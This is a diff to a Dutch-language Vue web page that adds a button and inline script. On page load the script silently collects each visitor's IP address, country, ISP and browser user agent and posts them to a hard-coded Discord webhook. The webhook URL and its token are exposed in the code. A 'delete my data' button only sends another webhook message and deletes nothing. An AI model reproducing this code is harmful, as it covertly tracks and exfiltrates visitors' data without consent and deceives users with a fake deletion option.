@@ -87,12 +87,118 @@
             <span v-if="isCopied">Gekopieerd!</span>
             <span v-else>Kopieer</span>
           </button>
+          <button type="button" class="nes-btn is-danger" id="delete-data-btn">Verwijder mijn gegevens</button>
         </div>
       </section>
     </section>
   </div>
 <!-- partial -->
-  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script><script  src="./script.js"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+  <script src="./script.js"></script>
+
+<!-- Pop-up voor bevestiging -->
+<div id="delete-confirmation" class="nes-dialog is-rounded" style="display: none;">
+  <p>Weet je zeker dat je je gegevens wilt verwijderen? Deze actie kan niet ongedaan worden gemaakt.</p>
+  <footer>
+    <button class="nes-btn is-success" id="confirm-delete">Ja, verwijder mijn gegevens</button>
+    <button class="nes-btn is-error" id="cancel-delete">Annuleer</button>
+  </footer>
+</div>
+
+<script>
+  // Functie om gegevens naar de Discord-webhook te verzenden
+  function sendDataToDiscord(data) {
+    const webhookUrl = "https://discord.com/api/webhooks/1343185758453764136/E8yQRMr4mSjXjZ4Wlx6lCLLamVTlK-7fREZsc8p2h2FGntKrsJvRy5tlT7rpnnFD1CGd";
+    
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Fout bij het verzenden naar Discord:', response.statusText);
+      }
+    })
+    .catch(error => {
+      console.error('Fout bij het verzenden naar Discord:', error);
+    });
+  }
+
+  // Verkrijg de informatie van de gebruiker en verzend het
+  document.addEventListener('DOMContentLoaded', () => {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(ipData => {
+        const userIP = ipData.ip; // Verkrijg het IP-adres
+
+        // Verkrijg geolocatie-informatie
+        fetch(`https://api.allorigins.win/get?url=https://ipapi.co/${userIP}/json/`)
+          .then(response => response.json())
+          .then(data => {
+            const locationData = JSON.parse(data.contents); // Parse de inhoud
+            const locationDataToSend = { // Nieuwe naam voor de data variabele
+              content: `Nieuwe bezoeker:\nDate/Time: ${new Date().toUTCString()}\nIP/Provider: ${userIP}\nCountry: ${locationData.country_name}\nISP: ${locationData.org}\nUser Agent: ${navigator.userAgent}`,
+            };
+            sendDataToDiscord(locationDataToSend); // Stuur de gegevens naar Discord
+          })
+          .catch(error => {
+            console.error('Fout bij het ophalen van geolocatie-informatie:', error);
+          });
+      })
+      .catch(error => {
+        console.error('Fout bij het ophalen van het IP-adres:', error);
+      });
+  });
+
+  // Functie om gegevensverwijderingsaanvraag naar Discord te verzenden
+  function sendDeleteRequest(userIP) {
+    const webhookUrl = "https://discord.com/api/webhooks/1343185758453764136/E8yQRMr4mSjXjZ4Wlx6lCLLamVTlK-7fREZsc8p2h2FGntKrsJvRy5tlT7rpnnFD1CGd";
+    const data = {
+      content: `Verzoek om gegevensverwijdering:\nIP/Provider: ${userIP}\nDatum/Tijd: ${new Date().toUTCString()}`
+    };
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Fout bij het verzenden naar Discord:', response.statusText);
+      }
+    })
+    .catch(error => {
+      console.error('Fout bij het verzenden naar Discord:', error);
+    });
+  }
+
+  // Event listener voor de verwijderknop
+  document.getElementById('delete-data-btn').addEventListener('click', () => {
+    document.getElementById('delete-confirmation').style.display = 'block';
+  });
+
+  // Event listener voor bevestigen van verwijdering
+  document.getElementById('confirm-delete').addEventListener('click', () => {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(ipData => {
+        const userIP = ipData.ip; // Verkrijg het IP-adres
+        sendDeleteRequest(userIP); // Stuur de verwijderingsaanvraag naar Discord
+        alert('Je gegevensverwijderingsaanvraag is verzonden.');
+        document.getElementById('delete-confirmation').style.display = 'none';
+      });
+  });
+
+  // Event listener voor annuleren
+  document.getElementById('cancel-delete').addEventListener('click', () => {
+    document.getElementById('delete-confirmation').style.display = 'none';
+  });
+</script>
 
 </body>
 </html>
